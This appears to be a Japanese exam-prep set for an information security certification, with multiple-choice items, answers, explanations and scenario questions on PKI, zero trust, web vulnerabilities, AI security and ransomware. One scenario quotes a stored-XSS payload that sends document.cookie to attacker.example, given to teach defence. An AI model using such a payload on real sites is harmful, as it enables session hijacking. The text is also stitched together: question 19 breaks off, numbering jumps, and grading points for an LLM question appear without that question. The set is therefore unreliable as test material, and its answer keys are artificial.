# 午前II 予想問題（四肢択一・21問）

### 〔分野〕暗号・認証・PKI(パスキー/FIDO2/OAuth/OIDC含む)

**問1** 電子証明書の失効確認方式である OCSP と、そのプライバシ・可用性上の課題を改善する OCSP ステープリングに関する記述のうち、適切なものはどれか。

- ア OCSP ステープリングでは、クライアントが検証対象サーバごとに OCSP レスポンダへ直接問い合わせるため、利用者のアクセス先が OCSP レスポンダに漏れる。
- イ OCSP ステープリングでは、サーバがあらかじめ取得した有効期限付きの署名済み OCSP レスポンスを TLS ハンドシェイク時にクライアントへ提示する。
- ウ OCSP は CRL 全体をダウンロードして失効を確認する方式であり、証明書ごとの個別問い合わせはできない。
- エ OCSP ステープリングを用いると、失効情報の署名者は当該 Web サーバ自身になる。

**正解**: イ
**解説**: OCSP ステープリングは、サーバが CA(OCSP レスポンダ)から取得した署名済みレスポンスを TLS ハンドシェイクに添付(staple)し、Certificate Status として提示する方式。クライアントがレスポンダへ直接問い合わせないため、アクセス先の漏えい(アはステープリングでない従来 OCSP の課題)を防ぎ、レスポンダの負荷・可用性依存も下げる。ウは CRL の説明(OCSP は証明書ごとの個別問い合わせが可能)、エは署名者はあくまで CA(OCSP レスポンダ)であり Web サーバではないので誤り。

**問2** サーバ間 API 通信で mTLS(相互 TLS)と、証明書にバインドしたアクセストークン(certificate-bound token, RFC 8705)を組み合わせる主目的として、最も適切なものはどれか。

- ア トークンが漏えいしても、対応するクライアント証明書の秘密鍵を持たない第三者は当該トークンを使えないようにする。
- イ トークンのペイロードを暗号化し、リソースサーバ以外が内容を読めないようにする。
- ウ トークンの有効期限を無期限にし、再発行を不要にする。
- エ クライアントがパスワードを送信することで多要素認証を実現する。

**正解**: ア
**解説**: certificate-bound token(RFC 8705)は、アクセストークンを mTLS で提示したクライアント証明書のサムプリント(確認方法クレーム `cnf` の `x5t#S256`)に束縛する。リソースサーバはトークン提示時の mTLS 証明書のハッシュと `cnf` を照合するため、トークンを盗まれても正規クライアント証明書の秘密鍵がなければ利用できず、ベアラトークンの盗難再利用(トークンリプレイ)を防ぐ。ゼロトラストのサービス間通信で有効。イ・ウ・エはいずれも目的ではない。

**問3** 耐量子計算機暗号(PQC)への移行に関する記述のうち、最も適切なものはどれか。

- ア 現行の RSA や楕円曲線暗号(ECC)による鍵交換・署名は、量子計算機のショアのアルゴリズムにより危殆化する恐れがあるため、格子ベース等の PQC への移行が検討されている。
- イ PQC は情報理論的安全性をもち、計算能力に依存せず解読不能であることが数学的に保証されている。
- ウ 移行期には安全性の観点から、従来暗号と PQC を併用するハイブリッド鍵交換は避け、PQC 単独に一括で切り替えるべきである。
- エ 共通鍵暗号 AES-256 はグローバ(Grover)の探索により実質的な安全性が完全に失われるため、PQC 移行では真っ先に廃止される。

**正解**: ア
**解説**: ショアのアルゴリズムは素因数分解・離散対数を多項式時間で解くため、RSA/ECC など公開鍵暗号が危殆化する。対策として NIST 標準化(ML-KEM(FIPS 203)/ML-DSA 等の格子ベース)や CRYPTREC の検討が進む。イは誤りで、PQC の安全性は格子問題等の計算量的仮定に依存し、情報理論的安全ではない。ウは逆で、実装バグや PQC 自体の未成熟に備え移行期はハイブリッド鍵交換(従来+PQC の両方を破らないと解けない構成)が推奨される。エは誤りで、グローバは探索計算量を平方根に下げる(実効鍵長が半減=AES-256 は約 128 ビット相当)にとどまり、AES-256 なら量子環境でも十分安全とされる。

### 〔分野〕ネットワーク・クラウド・ゼロトラスト（SASE/SSE, DNS, メール認証, mTLS）

**問4** SASE(Secure Access Service Edge)の構成要素のうち、SASEからSD-WANなどのネットワーク機能を除き、SWG・CASB・ZTNAといったセキュリティ機能群だけを指す概念はどれか。

- ア CNAPP
- イ CSPM
- ウ SSE
- エ XDR

**正解**: ウ
**解説**: SASE ≒ SD-WAN(ネットワーク機能) + SSE(セキュリティ機能)という関係で捉えられる。SSE(Security Service Edge)はSWG/CASB/ZTNA/FWaaS等のセキュリティ機能をクラウドで統合提供する概念。CSPMはクラウドの設定ミスやコンプライアンス逸脱を検出するポスチャ管理、CNAPPはCSPM/CWPP等を包含するクラウドネイティブアプリ保護基盤で、いずれもクラウド資産側の保護。XDRは複数レイヤの検知・対応(EDR拡張)であり、いずれもアクセス経路上のセキュリティエッジであるSSEとは別概念。

**問5** VPNの代替として用いられるZTNA(Zero Trust Network Access)の特徴として、最も適切なものはどれか。

- ア 認証済み端末に対して社内ネットワークセグメント全体への到達性を付与する。
- イ アプリケーション単位でアクセスを許可し、認可されていないアプリの存在自体を秘匿する。
- ウ 送信元IPアドレスをACLに登録した端末だけを常時信頼し、以後の再認証を省略する。
- エ 拠点間をIPsecトンネルで接続し、境界ファイアウォールで一括制御する。

**正解**: イ
**解説**: ZTNAは最小権限に基づきアプリケーション単位でアクセスを許可し、ブローカを介した接続により認可されていないアプリの所在(IPやポート)を外部から秘匿する。アはVPNの過剰な信頼範囲の問題そのもの。ウの「一度信頼したら以後は再認証省略」はゼロトラストの原則「常に検証(never trust, always verify)」に反する。エは従来の境界型ネットワークの説明。

**問6** 送信ドメイン認証に関する記述のうち、DMARCの説明として適切なものはどれか。

- ア 送信を許可するメールサーバのIPアドレスをDNSのTXTレコードに登録し、エンベロープFromの正当性を検証する。
- イ 送信側が秘密鍵でメールに電子署名し、受信側がDNSで公開した公開鍵で改ざんを検知する。
- ウ SPFまたはDKIMの認証成功に加え、認証されたドメインとヘッダFromドメインとの一致(アライメント)を検証し、none/quarantine/rejectのポリシーを適用する。
- エ DMARCをquarantine以上で運用するドメインに対し、メールクライアント上でブランドロゴを表示する。

**正解**: ウ
**解説**: アはSPF、イはDKIM、エはBIMI(DMARCのenforcement=quarantine/rejectが前提)の説明。DMARCはSPF/DKIMいずれかの認証成功に加え、その認証済みドメインとヘッダFromドメインのアライメント(SPFはエンベロープFromドメイン、DKIMはd=ドメインとの一致)を要求する点が本質。rua/rufレポートで送信実態を可視化しつつ、ポリシーをnone→quarantine→rejectと段階適用する。

**問7** 認可コードフローにおける認可コード横取り攻撃(authorization code interception)への対策として、`code_verifier`と、そこから導出する`code_challenge`を用いて正規クライアントのみがトークン交換できることを保証する仕組みはどれか。

- ア PKCE
- イ HSTS
- ウ SNI
- エ OCSPステープリング

**正解**: ア
**解説**: PKCE(Proof Key for Code Exchange, RFC 7636)はパブリッククライアント等での認可コード横取り対策。クライアントは高エントロピーの`code_verifier`(43〜128文字)を生成し、S256方式ではその`code_challenge = BASE64URL(SHA-256(code_verifier))`を認可要求時に送信、トークン交換時に元の`code_verifier`を提示させて一致を検証する(plain方式もあるがS256が推奨)。これにより横取りしたコードだけでは交換できない。HSTSは常時HTTPS強制、SNIはTLSハンドシェイクでの宛先ホスト名指定、OCSPステープリングは証明書失効確認の効率化で、いずれも別物。

### 〔分野〕Web/アプリケーション脆弱性(OWASP, SQLi/XSS/CSRF/SSRF, セキュアコーディング)

**問8** Cookieに設定する属性のうち、クロスサイトリクエストフォージェリ(CSRF)の緩和を主目的として、他サイトを起点とするクロスサイトリクエストにCookieを送信させないよう制御する属性はどれか。

- ア Secure属性
- イ HttpOnly属性
- ウ SameSite属性
- エ Domain属性

**正解**: ウ
**解説**: SameSite属性(Lax/Strict)はクロスサイトのリクエストに対するCookie自動送信を抑制し、CSRFの緩和に寄与する。HttpOnlyはJavaScriptからの読み取り防止(XSSによるCookie窃取の緩和)、SecureはHTTPS接続時限定の送信であり目的が異なる。SameSiteは緩和策であり、CSRFトークンによる照合を代替するものではない。

**問9** OWASP Top 10(2021)で「Injection」に分類されるクロスサイトスクリプティング(XSS)のうち、格納型(蓄積型)XSSの説明として適切なものはどれか。

- ア 攻撃者が仕込んだスクリプトがDBやログなどサーバ側に永続化され、当該データを閲覧した利用者のブラウザで実行される
- イ URLパラメタに含まれるスクリプトが応答にそのまま反映され、被害者がリンクを踏んだ際に実行される
- ウ サーバへのスクリプト送信を伴わず、クライアント側JavaScriptが入力をDOMへ反映する過程でスクリプトが実行される
- エ 正規サイトを透過的なiframeで覆い、利用者の操作を誘導してクリックさせる

**正解**: ア
**解説**: 格納型XSSはスクリプトがサーバ側に永続化され、閲覧者へ継続的・無差別に配信される点が特徴。イは反射型、ウはDOM Based XSS、エはクリックジャッキングの説明。

**問10** Webアプリが利用者からのパラメタで指定されたファイルパスを検証せずにサーバ上のファイルを読み込む実装がある。「../」などを含む入力で公開ディレクトリ外のファイルを不正に参照される脆弱性の名称と、その根本対策として適切な組合せはどれか。

- ア OSコマンドインジェクション ― シェルを介さないAPIの利用
- イ ディレクトリトラバーサル ― 入力を識別子に限定し、正規化後に許可ディレクトリ配下か検証する
- ウ HTTPヘッダインジェクション ― 改行コードの除去
- エ オープンリダイレクト ― リダイレクト先の許可リスト化

**正解**: イ
**解説**: パスの相対参照を悪用する脆弱性はディレクトリトラバーサル(パストラバーサル)。ファイル名を直接受け取らず識別子経由で解決するか、パスを正規化(canonicalize)したうえで基準ディレクトリ配下であることを検証するのが根本対策。「../」の単純な文字列除去はエンコードや多重表現で回避され得るため不十分。

### 〔分野〕AIセキュリティ・LLM(OWASP LLM Top10, プロンプトインジェクション, RAG, AIエージェント, MITRE ATLAS)

**問11** AIシステムへの攻撃を体系化したナレッジベースであり、MITRE ATT&CK の考え方をAI/機械学習システムの攻撃戦術・技法(TTP)に拡張したものはどれか。

- ア MITRE D3FEND
- イ MITRE ATLAS
- ウ NIST AI RMF
- エ ISO/IEC 42001

**正解**: イ
**解説**: ATLAS(Adversarial Threat Landscape for Artificial-Intelligence Systems)は、ATT&CKと同様の「戦術×技法」マトリクス形式で、AI/機械学習システムへの攻撃TTPを実事例に基づき整理したナレッジベース。アのD3FENDは防御技術(対策)を体系化したマッピング、ウのNIST AI RMFはAIのリスクを管理するためのフレームワーク、エのISO/IEC 42001はAIマネジメントシステム(AIMS)の認証規格であり、いずれも攻撃TTPの体系化を主目的とはしない。

**問12** 機械学習モデルに対する "敵対的サンプル(Adversarial Example)による回避攻撃(Evasion Attack)" の説明として適切なものはどれか。

- ア 公開APIへ大量のクエリを送り、応答から内部モデルの機能を複製する。
- イ モデルの出力を手がかりに、学習に用いられたデータや個人情報を復元する。
- ウ 人間には知覚しにくい微小な摂動を推論時の入力に加え、分類器に誤った分類をさせる。
- エ 事実と異なる内容を、モデルがあたかも正しいかのように自信を持って生成する。

**正解**: ウ
**解説**: 回避攻撃は「推論時(inference)」に入力へ微小な摂動を加えて誤分類を誘発する攻撃。アはモデル抽出/窃取(Model Extraction/Stealing)、イはモデル反転(Model Inversion。学習データ所属を推定するメンバーシップ推論と併せて問われる)、エはハルシネーションに起因する誤情報(OWASP LLM09:2025 "Misinformation")。攻撃の「フェーズ(学習時か推論時か)」と「目的(誤分類・複製・データ復元・誤情報)」の2軸で区別する。

**問13** OWASP LLM06:2025 "過剰な代理権限(Excessive Agency)" を持つAIエージェントのリスクを低減する対策として、最も適切なものはどれか。

- ア すべてのツール呼び出しをLLMの判断のみで自動実行し、応答速度を最優先する。
- イ エージェントに付与するツール・権限・自律性を最小化し、影響の大きい操作(外部送信・削除・決済など)の実行前に人間の承認(human-in-the-loop)を挟む。
- ウ 出力トークン数の上限を撤廃し、より詳細な応答を返せるようにする。
- エ システムプロンプトを応答に含めて、利用者が挙動を検証できるようにする。

**正解**: イ
**解説**: Excessive Agencyは、エージェントに与えた機能(ツール)・権限・自律性が過大なために、誤動作やプロンプトインジェクション成立時の被害が拡大する問題。定石は最小権限・ツール制限・不可逆/高影響操作への人間承認、および操作の監査ログ化。アは自律性と権限を最大化し逆効果、ウはLLM10 "無制限消費" を助長、エはLLM07 "システムプロンプトの漏えい" を招くため、いずれも不適切。

### 〔分野〕マルウェア・攻撃手法・インシデント対応（MITRE ATT&CK, ランサムウェア, EDR/XDR）

**問14** ランサムウェアによる被害拡大を防ぐためのバックアップ運用として、最も効果が高いものはどれか。

- ア バックアップデータを本番サーバと同一のファイルサーバ上の別フォルダに毎時保存する。
- イ バックアップ後に書き換え・削除ができないイミュータブル(改変不可)ストレージへ保存し、あわせてオフラインの複製を保持する。
- ウ バックアップ管理者と本番システム管理者に同一の特権アカウントを共有させ、復旧を迅速化する。
- エ ネットワーク上で常時オンラインの単一の共有ストレージに世代を集約し、容量効率を最優先する。

**正解**: イ
**解説**: 近年のランサムウェアはバックアップの探索・破壊を定石とするため、書き換え・削除不可のイミュータブルバックアップ、3-2-1 ルール(3 世代・2 媒体・1 拠点分離)、オフライン/エアギャップ保管が有効。ア・エはバックアップが常時オンラインで本番と同一系統にあるため暗号化被害が同時に波及する。ウは特権アカウント共有により、侵害時にバックアップも一括で破壊・暗号化されるリスクを高める。

**問15** EDR、XDR、MDR の説明の組合せとして、適切なものはどれか。

- ア EDR はネットワーク・クラウド・メール・ID まで横断的に相関分析する仕組みであり、XDR はエンドポイント単体に限定した監視である。
- イ XDR は EDR の監視範囲をエンドポイント外へ拡張し横断的に相関分析する仕組みであり、MDR はそれらの監視・運用を外部が代行するサービスである。
- ウ MDR はログを収集・相関する製品(SIEM)そのものを指し、EDR/XDR とは無関係である。
- エ EDR は対応を自動化するプレイブック実行基盤(SOAR)の別称であり、XDR はその上位互換である。

**正解**: イ
**解説**: EDR=エンドポイントの監視・検知・対応、XDR=EDR をエンドポイント外(NW/クラウド/メール/ID 等)へ拡張し横断的に相関、MDR=これらの監視・運用を専門ベンダが代行するサービス、が正しい対応。アは EDR と XDR の説明が逆。ウの「ログ収集・相関(SIEM)」、エの「対応自動化(SOAR)」はいずれも別概念であり、EDR/XDR とは異なる。

**問16** 攻撃者が窃取済みの認証情報のハッシュ値を用い、平文パスワードを復元することなく他システムへ認証を通す横展開(Lateral Movement)の手法はどれか。

- ア Pass the Hash
- イ DNS リフレクション攻撃
- ウ クリプトジャッキング
- エ ディレクトリトラバーサル

**正解**: ア
**解説**: Pass the Hash は NTLM ハッシュ等をそのまま認証に再利用し、平文復元なしで横展開する手法。ATT&CK では Use Alternate Authentication Material(T1550.002)に対応し、戦術としては Lateral Movement および Defense Evasion に位置づけられる(ハッシュを取得するダンプ行為自体は Credential Access、取得済みハッシュの再利用が Lateral Movement/Defense Evasion であり、両者を混同しない)。イは DNS を悪用した DRDoS(リフレクション/増幅)攻撃、ウは資源を無断でマイニングに悪用する攻撃、エはパストラバーサルによる想定外ファイルへの不正アクセスで、いずれも横展開の手法ではない。

### 〔分野〕セキュリティマネジメント・法規・ガイドライン(ISMS, リスクマネジメント, 個人情報保護法, サプライチェーン/SBOM)

**問17** JIS Q 27000:2019(情報セキュリティマネジメントシステム-用語)における「リスク対応」の説明として,適切なものはどれか。

- ア　リスクの重大性を評価するために,算定されたリスクを与えられたリスク基準と比較するプロセス
- イ　リスクを発見,認識及び記述するプロセスであり,リスク源,事象,それらの原因及び起こり得る結果の特定を含む
- ウ　リスクを修正するプロセスであり,リスクの回避,低減,共有(移転)及び保有(受容)などの選択肢を含む
- エ　リスクの特質を理解し,リスクレベルを決定するプロセス

**正解**: ウ
**解説**: リスク対応(risk treatment)は「リスクを修正するプロセス」であり,リスクの回避,除去(リスク源の除去),起こりやすさ・結果の変更(低減),他者との共有(移転),リスク保有(受容)などの選択肢の選定・実施を含む。アはリスク評価(リスク分析の結果をリスク基準と比較するプロセス),イはリスク特定,エはリスク分析の定義であり,これら三つはいずれもリスクアセスメントの構成要素である点で対応とは異なる。

**問18** 組織が受容できないと判断したリスクについて,追加の管理策を導入した後になお残るリスクを表す用語はどれか。

- ア　固有リスク
- イ　残留リスク
- ウ　二次リスク
- エ　リスク選好

**正解**: イ
**解説**: 残留リスク(residual risk)はリスク対応後に残るリスクを指し,その受容にはリスク所有者(リスクオーナー)の承認が必要となる。アの固有リスクは管理策適用前のリスク,ウの二次リスクは,ある対応策の実施自体が新たに生じさせるリスク,エのリスク選好(risk appetite)は組織が進んで受容又は追求しようとするリスクの量・種類であり,残留リスクとは概念が異なる。

**問19** ソフトウェアサプライチェーンの完全性を確保する取組みに関する記述のうち,適切なものはどれか。

- ア　SLSAは,ビルドプロセスの改ざん耐性・来歴(プロベナンス)の保証度合いをレベルで示す,サプライチェーン完全性のためのフレームワークである。

## 問3　Web/アプリケーション脆弱性(OWASP, SQLi/XSS/CSRF/SSRF, セキュアコーディング)

（分野: Web/アプリケーション脆弱性(OWASP, SQLi/XSS/CSRF/SSRF, セキュアコーディング)）

**状況設定**
F社はオンライン掲示板サービスを運営している。利用者は投稿本文とプロフィールの自己紹介文を登録でき、他の利用者の画面に表示される。開発チームは、投稿本文についてはHTMLエスケープを行っていたが、自己紹介文は「太字や色付けを許可したい」という要望を受け、利用者が入力したHTMLをそのまま保存・出力する仕様とした。リリース後、一部利用者のセッションが乗っ取られ、本人になりすました投稿が行われるインシデントが発生した。調査の結果、ある利用者の自己紹介文に次の文字列が保存されていたことが判明した。

`<img src=x onerror="new Image().src='//attacker.example/c?'+document.cookie">`

なお、セッション管理用CookieにはHttpOnly属性が付与されていなかった。また、投稿フォームには他サイトからのリクエストを防ぐトークンが実装されていなかった。

**設問**

(1) 今回悪用された脆弱性の種類(XSSの分類名)を答えよ。攻撃者のスクリプトが被害者のブラウザで実行され、セッション乗っ取りに至った経路を、保存されたペイロードの動作に触れて説明せよ。

(2) 自己紹介文でHTMLの装飾を許可しつつXSSを防ぐには、どのような出力時の処理が適切か。具体的な方式を1つ述べよ。

(3) Cookieの窃取を困難にするために付与すべきCookie属性を1つ挙げ、その効果を述べよ。

(4) なりすまし投稿は、窃取したセッションを用いずともCSRFによっても実行可能であった。CSRFに対する根本的な対策を1つ述べよ。

**解答例**:
(1) 分類: 格納型(蓄積型)XSS。経路: 攻撃者の自己紹介文に含まれる `onerror` 属性付きimgタグがエスケープ・サニタイズされずそのままDBに保存され、被害者がそのプロフィールを閲覧してHTMLが描画される際、存在しない画像 `src=x` の読み込み失敗を契機に `onerror` のJavaScriptが実行される。スクリプトが `document.cookie` を外部サーバ(attacker.example)へ送信し、HttpOnly未設定のためセッションCookieが窃取され、攻撃者がそのセッションIDを用いて本人になりすました。
(2) 入力をそのまま出力せず、許可するタグ・属性を限定したホワイトリスト方式のHTMLサニタイズ(実績ある信頼できるサニタイズライブラリを使用)を出力時に行い、`onerror` 等のイベントハンドラ属性や `script` 要素、`javascript:` 等の危険なURLスキームを除去する。ブラックリストによる個別除去は回避されやすく不十分。
(3) 属性: HttpOnly。効果: JavaScriptからdocument.cookieでCookieを参照できなくなり、XSSが成立してもスクリプトによるセッションCookieの読み取り・外部送信を防げる(あわせてSecure属性でHTTPS接続時限定送信とし盗聴を防ぐ)。
(4) 更新系(状態変更)リクエストに対し、利用者のセッションごとに固有で推測困難なCSRFトークンを発行してフォーム等に埋め込み、サーバ側で送信値と保持値を照合し不一致なら拒否する。加えてセッションCookieにSameSite属性を付与して補強する。

**採点のポイント**:
- (1)で「格納型XSS」と分類でき、保存→閲覧時にHTMLとして描画→onerror発火→document.cookie送信→なりすましという因果が説明されているか。HttpOnly未設定がCookie窃取を可能にした点に触れられていれば加点。
- (2)がエスケープ一辺倒でなく、装飾許可要件を満たす許可リスト型サニタイズに言及しているか(ブラックリスト方式のみ・自前実装のみは減点)。
- (3)でHttpOnlyの効果(スクリプトからのCookie参照不可)が正しく述べられているか。
- (4)がセッション単位の推測困難なトークンの発行と照合(および補助的なSameSite)というCSRFの本質的対策になっているか。Referer/Origin検証のみを本質対策とした場合は限定的評価。

- 設問1 名称:ベクトルと埋め込みの脆弱性(LLM08:2025)。対策例:「検索時に利用者の権限で結果をフィルタリングし、部署ごとにインデックスを分離する」。
- 設問2 名称:間接プロンプトインジェクション(OWASP LLM01)。問題点例:「外部文書の内容を検証せずシステムプロンプトへ連結し、指示とデータを同一チャネルで処理しているため」。
- 設問3 脆弱性名:クロスサイトスクリプティング(格納型XSS)。対策:LLM出力を信頼境界の外側として扱い、HTMLへの出力時にコンテキストに応じたエスケープ(出力サニタイズ)を行う。加えてCSPで許可元を制限する。

**採点のポイント**:
- 設問1:権限/テナント分離の不備を突く攻撃(LLM08)であることを捉え、対策が「検索結果の権限フィルタリング」または「インデックス分離」に踏み込めているか。単に「アクセス制御をする」のみの記述は減点。
- 設問2:「間接」プロンプトインジェクションを明示し、原因を「外部データを検証せず指示チャネル(システムプロンプト)へ連結し、指示とデータが未分離」の観点で説明できているか(直接型との区別)。
- 設問3:LLM出力を信頼境界の外側として扱う設計思想と、出力エスケープ(サニタイズ)の対策が結び付いているか。「入力のエスケープ」ではなく「出力時のエスケープ」を書けているか。既存のWebアプリセキュリティ知識との接続を評価。

## 問5　ランサムウェアインシデント対応

（分野: マルウェア・攻撃手法・インシデント対応（MITRE ATT&CK, ランサムウェア, EDR/XDR））

D 社は従業員 1,200 名の製造業である。ある月曜朝、複数の共有サーバでファイルの拡張子が書き換わり、各フォルダに脅迫文(暗号化した上でデータを窃取済みであり、支払わなければ公開すると記載)が置かれていることが判明した。SOC の調査で、前週金曜に業務用 VPN 経由で 1 台の端末が外部から不正ログインされ、その後 LSASS からの認証情報ダンプ、RDP による他サーバへの接続、深夜のデータ暗号化が時系列で確認された。VPN は多要素認証(MFA)未導入で、当該アカウントのパスワードは他サービスと使い回されていた。バックアップは本番と同一の NAS 上に毎日保存していたが、当該 NAS も暗号化されていた。E 主任は CSIRT として初動対応と再発防止策を立案することになった。

設問1 本インシデントは、暗号化に加えデータ窃取・暴露をも材料に金銭を要求している。この攻撃手口の名称を答えよ。
設問2 攻撃者が VPN 経由で最初に侵入できた要因を、認証の観点から二つ挙げよ。
設問3 バックアップから業務を復旧できなかった技術的要因を述べ、これを防ぐバックアップ運用上の改善策を二つ挙げよ。
設問4 本事案で観測された「LSASS からの認証情報ダンプ」「RDP による他サーバへの接続」は、MITRE ATT&CK ではそれぞれどの戦術(Tactics)に該当するか答えよ。

**解答例**:
- 設問1: 二重脅迫(ダブルエクストーション)。
- 設問2: (1) VPN に多要素認証が導入されておらず、パスワードのみの単要素認証であった点。(2) 当該アカウントのパスワードが他サービスと使い回されており、外部で漏えい済みの認証情報を悪用された(クレデンシャルスタッフィング等が成立した)点。
- 設問3: 要因=バックアップが本番と同一の NAS 上にオンライン(書き換え可能な状態)で保存されており、ランサムウェアの探索・暗号化がバックアップ側にも同時に波及したため。改善策=(1) 書き換え・削除ができないイミュータブルストレージ(または WORM/世代ロック)へ保存する。(2) オフライン(エアギャップ)または隔離ネットワークで複製を保持し、3-2-1 ルールに沿って世代・媒体・拠点を分散する。
- 設問4: LSASS からの認証情報ダンプ=認証情報アクセス(Credential Access)。RDP による他サーバへの接続=横展開(Lateral Movement)。

**採点のポイント**: 設問1は「二重脅迫/ダブルエクストーション」を正確に(単なる「ランサムウェア」は不可)。設問2は MFA 未導入(単要素認証)とパスワード使い回し(漏えい済み認証情報の悪用)の両方に言及していること。設問3はバックアップが本番と同一・オンラインで書き換え可能だった点を要因として特定し、イミュータブル化とオフライン/隔離保管の二つを挙げていること。設問4は Credential Access と Lateral Movement を取り違えず対応させていること。

## 問6　防御側でのAIエージェント活用とガバナンス

（分野: AI駆動型サイバー攻撃・フロンティアAI（自律型攻撃/防御, デュアルユース, AIガバナンス））

金融系のS社のSOCは、アラート対応の遅延が課題となっていた。攻撃の高速化・自動化に対抗するため、S社はSOARに加えて、検知内容の分析、影響範囲の調査、端末の隔離やアカウントの無効化までを自律的に行うAIエージェントの導入を計画している。導入検討会では、N部長から「AIの判断ですべて自動実行してよいのか。誤検知で勘定系システムを止めたらどうするのか」という指摘があり、(a)自動実行の範囲、(b)AIエージェントへの権限付与、(c)事後検証の仕組み、を整理することになった。

設問1　AIエージェントによる対応の完全自動化がもつリスクを、業務影響の観点から35字以内で述べよ。

設問2　影響の大きい対応と小さい対応とで自動実行の扱いを分ける設計方針を、human-in-the-loop（人間の承認の組込み）の考え方を用いて60字以内で述べよ。

設問3　AIエージェントに付与する権限について留意すべき原則を一つ挙げ、その理由とともに40字以内で述べよ。

設問4　AIの判断を事後に検証可能とするために記録すべき事項を二つ挙げよ。

**解答例**:
- 設問1: 誤検知による自動遮断で正常な業務システムが停止するおそれがある。（32字）
- 設問2: 端末隔離など影響が限定的な対応は自動実行とし、本番システムの遮断など影響の大きい対応は人間の承認を経て実行する。
- 設問3: 最小権限の原則。エージェントの誤動作や乗っ取り時の被害範囲を限定するため。
- 設問4: ①判断の根拠となった検知内容・入力情報　②実行した対応の内容と実行時刻（承認者を含む操作履歴も可）

**採点のポイント**:
- 設問1は「誤検知→正常業務の停止」の因果が明確か。
- 設問2は「影響度に応じた自動/承認の切り分け」と「人間の承認（human-in-the-loop）」の両方に言及できているか。
- 設問3は最小権限（least privilege）。「理由」は被害限定・影響範囲の抑制。
- 設問4は監査可能性（判断根拠＋実行内容のログ）。
